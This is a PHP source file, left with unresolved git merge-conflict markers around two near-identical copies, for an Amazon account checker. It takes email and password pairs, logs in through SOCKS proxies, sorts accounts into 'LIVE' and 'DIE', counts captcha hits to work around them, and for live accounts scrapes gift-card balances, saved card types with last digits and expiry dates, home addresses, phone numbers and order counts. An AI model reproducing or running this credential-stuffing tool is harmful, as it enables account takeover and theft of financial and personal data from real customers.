<<<<<<< HEAD
<?php
// 1: NOTICE, -1: UNCHECK, 2: DIE, 3: BAD/SOCKS DIE, 0: LIVE //
session_start();
date_default_timezone_set("Asia/Jakarta");
require 'System/class_curl.php';

function checkerra($em, $ps, $sock)
{
    $pisah = array($em,$ps);
  // cek wrong
  if ($pisah[1] == '' || $pisah[1] == null) {
      return(PHP_EOL.'{"error":-1,"msg":"<font color=red><b>UNKNOWN</b></font> | '.$pisah[0].' | '.$pisah[1].' | Unable to checking"}');
  }

    $curl = new curl();
    $curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
    if ($sock != "127.0.0.1:8080") {
        $curl->socks($sock);
    }
    $curl->ssl(0, 2);
    $curl->timeout(10);
    $url = "https://www.amazon.com/gp/navigation/redirector.html/ref=sign-in-redirect?ie=UTF8&associationHandle=usflex&currentPageURL=https%3A%2F%2Fwww.amazon.com%2Fref%3Dnav_custrec_signin&pageType=Gateway&yshURL=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_signin";
    $page = $curl->get($url);
    if ($page) {
        $appactiontoken = get_string($page, '<input type="hidden" name="appActionToken" value="', '"');
        $maxauth = get_string($page, '<input type="hidden" name="openid.pape.max_auth_age" value="', '"');
        $returnto = get_string($page, '<input type="hidden" name="openid.return_to" value="', '"');
        $prevrid = get_string($page, '<input type="hidden" name="prevRID" value="', '"');
        $identity = get_string($page, '<input type="hidden" name="openid.identity" value="', '"');
        $assochandle = get_string($page, '<input type="hidden" name="openid.assoc_handle" value="', '"');
        $mode = get_string($page, '<input type="hidden" name="openid.mode" value="', '"');
        $nspape = get_string($page, '<input type="hidden" name="openid.ns.pape" value="', '"');
        $claimedid = get_string($page, '<input type="hidden" name="openid.claimed_id" value="', '"');
        $pageid = get_string($page, '<input type="hidden" name="pageId" value="', '"');
        $opendidns = get_string($page, '<input type="hidden" name="openid.ns" value="', '"');
        $postData = "appActionToken={$appactiontoken}&appAction=SIGNIN&openid.pape.max_auth_age={$maxauth}&openid.return_to={$returnto}&prevRID={$prevrid}&openid.identity={$identity}&openid.assoc_handle={$assochandle}&openid.mode={$mode}&openid.ns.pape={$nspape}&openid.claimed_id={$claimedid}&pageId={$pageid}&openid.ns={$opendidns}&email={$pisah[0]}&create=0&password={$pisah[1]}&metadata1=";
        $url_login = "https://www.amazon.com/ap/signin";
        $header = array(
              'Host: www.amazon.com',
              'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
              'Accept-Language: en-US,en;q=0.5',
              'Referer: https://www.amazon.com/gp/navigation/redirector.html/ref=sign-in-redirect?ie=UTF8&associationHandle=usflex&currentPageURL=https%3A%2F%2Fwww.amazon.com%2Fref%3Dnav_custrec_signin&pageType=Gateway&yshURL=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_signin',
              'Connection: keep-alive',
              'Content-Type: application/x-www-form-urlencoded'
              );
        $curl->header($header);
        $page = $curl->post($url_login, $postData);
        if (inStr($page, "Your password is incorrect")) {
            $result['error'] = 2;
            $result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
            return(PHP_EOL.json_encode($result));
        } elseif (inStr($page, "We can not find an account with that email address")) {
            $result['error'] = 2;
            $result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
            return(PHP_EOL.json_encode($result));
        } elseif (inStr($page, "Email address already in use")) {
            $result['error'] = 2;
            $result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
            return(PHP_EOL.json_encode($result));
        } elseif (inStr($page, "Enter a valid e-mail or mobile number")) {
            $result['error'] = 2;
            $result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
            return(PHP_EOL.json_encode($result));
        } elseif (inStr($page, "To better protect your account") || inStr($page, "Sorry, we just need to make sure you're not a robot.")) {
            if (isset($_SESSION['captcha_'.$pisah[0]])) {
                if ($_SESSION['captcha_'.$pisah[0]] > rand(1, 3)) {
                    $result['error'] = 2;
                    $result['msg'] = '<b style="color:red;">Got Captcha</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | can meaning this acc is valid/not valid';
                    unset($_SESSION['captcha_'.$pisah[0]]);
                    return(PHP_EOL.json_encode($result));
                }
                $_SESSION['captcha_'.$pisah[0]] = $_SESSION['captcha_'.$pisah[0]] + 1;
            } else {
                $_SESSION['captcha_'.$pisah[0]] = 1;
            }
            $result['error'] = 3;
            $result['msg'] = '<font color=red>'.$sock.'</font> | Captcha';
            return(PHP_EOL.json_encode($result));
        } elseif (inStr($page, "Security questions")) {
            $result['error'] = 0;
            $result['msg'] = '<b style="color:green;">LIVE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | <font color=red>Security Questions</font>';
            return(PHP_EOL.json_encode($result));
        } elseif (inStr($page, "Your Account")) {
            // Gift Card
            $page_balance = $curl->get("https://www.amazon.com/gp/css/gc/balance?ie=UTF8&ref_=ya_view_gc");
            $gc1 = get_string($page_balance, '<td class="gcBalance">', '</br>');
            $gc2 = get_string($gc1, '<span>', '</span>');
            $gc = (empty($gc2) ? "<font color=red>Can't Grab</font>" : "<font color=green>$gc2</font>");
            $info['gc'] = 'Giftcards: '.$gc;
            // Card
            $page_card = $curl->get("https://www.amazon.com/gp/css/account/cards/view.html?ie=UTF8&ref_=ya_29&");
            preg_match_all('/inline; font-weight: normal">(.*)<\/h2><\/td>/i', $page_card, $type);
            preg_match_all('/<b>Number:<\/b><\/td><td>(.*)/i', $page_card, $ccn);
            preg_match_all('/Date:<\/b><\/td><td>(.*)<\/td><\/tr>/i', $page_card, $ccexp);
            $totalcc = count($type[1]);
            $i = 0;
            while ($i < $totalcc) {
                $num = get_string($ccn[1][$i], '************', '</td></tr>');
                $exp = explode("</td></tr>", $ccexp[1][$i]);
                @$cc .= "[".$type[1][$i]." - x".$num." - ".$exp[0]."] ";
                $i++;
            }
            $info['card'] = ($totalcc == 0 ? "No Card" : "<font color=red>Card(s): ".$totalcc."</font> <font color=blue>".$cc."</font>");
            // Get Info Address
            $page_address = $curl->get("https://www.amazon.com/a/addresses/");
            if (inStr($page_address, 'address-section-with-default')) {
                $address = array();
                $address['full_name'] = get_string($page_address, '<h5 id="address-ui-widgets-FullName" class="id-addr-ux-search-text aok-inline-block a-text-bold">', '</h5>');
                $address['line1'] = get_string($page_address, '<span id="address-ui-widgets-AddressLineOne" class="id-addr-ux-search-text">', '</span>');
                $address['post_code'] = get_string($page_address, '<span id="address-ui-widgets-CityStatePostalCode" class="id-addr-ux-search-text">', '</span>');
                $address['country'] = get_string($page_address, '<span id="address-ui-widgets-Country" class="id-addr-ux-search-text">', '</span>');
                $address['phone'] = get_string($page_address, '<span id="address-ui-widgets-PhoneNumber" class="id-addr-ux-search-text">', '</span>');
                $info['address'] = "<font color=purple>".implode(" - ", $address)."</font>";
            } else {
                $info['address'] = "<font color=red>No Address</font>";
            }
            // Order
            $page_order = $curl->get("https://www.amazon.com/gp/css/order-history/ref=orders");
            $info['order'] = (inStr($page_order, "You have not placed") ? '<font color=red>No Order</font>' : '<font color=blue>Order(s): '.get_string($page_order, '<span class="num-orders">', '</span>').'</font>');
            $result['error'] = 0;
            $result['msg'] = '<b style="color:green;">LIVE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | '.implode(" | ", $info);
            return(PHP_EOL.json_encode($result));
        } else {
            $resError = $curl->error();
            $result['error'] = 3;
            $result['msg'] = $sock.' | '.$resError;
            return(PHP_EOL.json_encode($result));
        }
    } else {
        $resError = $curl->error();
        $result['error'] = 3;
        $result['msg'] = $sock.' | '.$resError;
        return(PHP_EOL.json_encode($result));
    }
}
=======
<?php
// 1: NOTICE, -1: UNCHECK, 2: DIE, 3: BAD/SOCKS DIE, 0: LIVE //
session_start();
date_default_timezone_set("Asia/Jakarta");
require 'System/class_curl.php';

function checkerra($em,$ps,$sock){
  $pisah = array($em,$ps);
  // cek wrong
  if ($pisah[1] == '' || $pisah[1] == null) {
    return(PHP_EOL.'{"error":-1,"msg":"<font color=red><b>UNKNOWN</b></font> | '.$pisah[0].' | '.$pisah[1].' | Unable to checking"}');
  }

  $curl = new curl();
    $curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
    if ($sock != "127.0.0.1:8080") {
    $curl->socks($sock);
    }
    $curl->ssl(0, 2);
    $curl->timeout(10);
    $url = "https://www.amazon.com/gp/navigation/redirector.html/ref=sign-in-redirect?ie=UTF8&associationHandle=usflex&currentPageURL=https%3A%2F%2Fwww.amazon.com%2Fref%3Dnav_custrec_signin&pageType=Gateway&yshURL=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_signin";
    $page = $curl->get($url);
    if ($page){
      $appactiontoken = get_string($page,'<input type="hidden" name="appActionToken" value="','"');
      $maxauth = get_string($page,'<input type="hidden" name="openid.pape.max_auth_age" value="','"');
      $returnto = get_string($page,'<input type="hidden" name="openid.return_to" value="','"');
      $prevrid = get_string($page,'<input type="hidden" name="prevRID" value="','"');
      $identity = get_string($page,'<input type="hidden" name="openid.identity" value="','"');
      $assochandle = get_string($page,'<input type="hidden" name="openid.assoc_handle" value="','"');
      $mode = get_string($page,'<input type="hidden" name="openid.mode" value="','"');
      $nspape = get_string($page,'<input type="hidden" name="openid.ns.pape" value="','"');
      $claimedid = get_string($page,'<input type="hidden" name="openid.claimed_id" value="','"');
      $pageid = get_string($page,'<input type="hidden" name="pageId" value="','"');
      $opendidns = get_string($page,'<input type="hidden" name="openid.ns" value="','"');
      $postData = "appActionToken={$appactiontoken}&appAction=SIGNIN&openid.pape.max_auth_age={$maxauth}&openid.return_to={$returnto}&prevRID={$prevrid}&openid.identity={$identity}&openid.assoc_handle={$assochandle}&openid.mode={$mode}&openid.ns.pape={$nspape}&openid.claimed_id={$claimedid}&pageId={$pageid}&openid.ns={$opendidns}&email={$pisah[0]}&create=0&password={$pisah[1]}&metadata1=";
      $url_login = "https://www.amazon.com/ap/signin";
      $header = array(
              'Host: www.amazon.com',
              'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
              'Accept-Language: en-US,en;q=0.5',
              'Referer: https://www.amazon.com/gp/navigation/redirector.html/ref=sign-in-redirect?ie=UTF8&associationHandle=usflex&currentPageURL=https%3A%2F%2Fwww.amazon.com%2Fref%3Dnav_custrec_signin&pageType=Gateway&yshURL=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_signin',
              'Connection: keep-alive',
              'Content-Type: application/x-www-form-urlencoded'
              );
      $curl->header($header);
      $page = $curl->post($url_login,$postData);
            if (inStr($page, "Your password is incorrect")) {
        $result['error'] = 2;
        $result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
        return(PHP_EOL.json_encode($result));
      } else if (inStr($page, "We can not find an account with that email address")) {
        $result['error'] = 2;
        $result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
        return(PHP_EOL.json_encode($result));
      } else if (inStr($page, "Email address already in use")) {
        $result['error'] = 2;
        $result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
        return(PHP_EOL.json_encode($result));
      } else if (inStr($page, "Enter a valid e-mail or mobile number")) {
        $result['error'] = 2;
        $result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
        return(PHP_EOL.json_encode($result));
      } else if (inStr($page, "To better protect your account") || inStr($page, "Sorry, we just need to make sure you're not a robot.")) {
        if (isset($_SESSION['captcha_'.$pisah[0]])) {
          if ($_SESSION['captcha_'.$pisah[0]] > rand(1,3)) {
            $result['error'] = 2;
            $result['msg'] = '<b style="color:red;">Got Captcha</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | can meaning this acc is valid/not valid';
            unset($_SESSION['captcha_'.$pisah[0]]);
            return(PHP_EOL.json_encode($result));
          }
          $_SESSION['captcha_'.$pisah[0]] = $_SESSION['captcha_'.$pisah[0]] + 1;
        } else {
          $_SESSION['captcha_'.$pisah[0]] = 1;
        }
        $result['error'] = 3;
        $result['msg'] = '<font color=red>'.$sock.'</font> | Captcha';
        return(PHP_EOL.json_encode($result));
      } else if (inStr($page, "Security questions")) {
        $result['error'] = 0;
        $result['msg'] = '<b style="color:green;">LIVE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | <font color=red>Security Questions</font>';
        return(PHP_EOL.json_encode($result));
      } else if (inStr($page, "Your Account")) {
            // Gift Card
            $page_balance = $curl->get("https://www.amazon.com/gp/css/gc/balance?ie=UTF8&ref_=ya_view_gc");
$gc1 = get_string($page_balance,'<td class="gcBalance">','</br>');
$gc2 = get_string($gc1,'<span>','</span>');
            $gc = (empty($gc2) ? "<font color=red>Can't Grab</font>" : "<font color=green>$gc2</font>");
            $info['gc'] = 'Giftcards: '.$gc;
            // Card
            $page_card = $curl->get("https://www.amazon.com/gp/css/account/cards/view.html?ie=UTF8&ref_=ya_29&");
            preg_match_all('/inline; font-weight: normal">(.*)<\/h2><\/td>/i', $page_card, $type);
            preg_match_all('/<b>Number:<\/b><\/td><td>(.*)/i', $page_card, $ccn);
            preg_match_all('/Date:<\/b><\/td><td>(.*)<\/td><\/tr>/i', $page_card, $ccexp);
            $totalcc = count($type[1]);
            $i = 0;
            while($i < $totalcc) {
              $num = get_string($ccn[1][$i],'************','</td></tr>');
              $exp = explode("</td></tr>",$ccexp[1][$i]);
              @$cc .= "[".$type[1][$i]." - x".$num." - ".$exp[0]."] ";
              $i++;
            }
            $info['card'] = ($totalcc == 0 ? "No Card" : "<font color=red>Card(s): ".$totalcc."</font> <font color=blue>".$cc."</font>");
            // Get Info Address
            $page_address = $curl->get("https://www.amazon.com/a/addresses/");
            if (inStr($page_address,'address-section-with-default')) {
            $address = array();
            $address['full_name'] = get_string($page_address,'<h5 id="address-ui-widgets-FullName" class="id-addr-ux-search-text aok-inline-block a-text-bold">','</h5>');
            $address['line1'] = get_string($page_address,'<span id="address-ui-widgets-AddressLineOne" class="id-addr-ux-search-text">','</span>');
            $address['post_code'] = get_string($page_address,'<span id="address-ui-widgets-CityStatePostalCode" class="id-addr-ux-search-text">','</span>');
            $address['country'] = get_string($page_address,'<span id="address-ui-widgets-Country" class="id-addr-ux-search-text">','</span>');
            $address['phone'] = get_string($page_address,'<span id="address-ui-widgets-PhoneNumber" class="id-addr-ux-search-text">','</span>');
            $info['address'] = "<font color=purple>".implode(" - ",$address)."</font>";
            } else { 
            $info['address'] = "<font color=red>No Address</font>";
            }
            // Order
            $page_order = $curl->get("https://www.amazon.com/gp/css/order-history/ref=orders");
            $info['order'] = (inStr($page_order, "You have not placed") ? '<font color=red>No Order</font>' : '<font color=blue>Order(s): '.get_string($page_order,'<span class="num-orders">','</span>').'</font>');
          $result['error'] = 0;
          $result['msg'] = '<b style="color:green;">LIVE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | '.implode(" | ",$info);
          return(PHP_EOL.json_encode($result));
        } else {
          $resError = $curl->error();
          $result['error'] = 3;
          $result['msg'] = $sock.' | '.$resError;
          return(PHP_EOL.json_encode($result));
        }
    } else {
          $resError = $curl->error();
          $result['error'] = 3;
          $result['msg'] = $sock.' | '.$resError;
          return(PHP_EOL.json_encode($result));
    }
}
?>
>>>>>>> ab49f339ee981bd89d75c62da87595e800346123
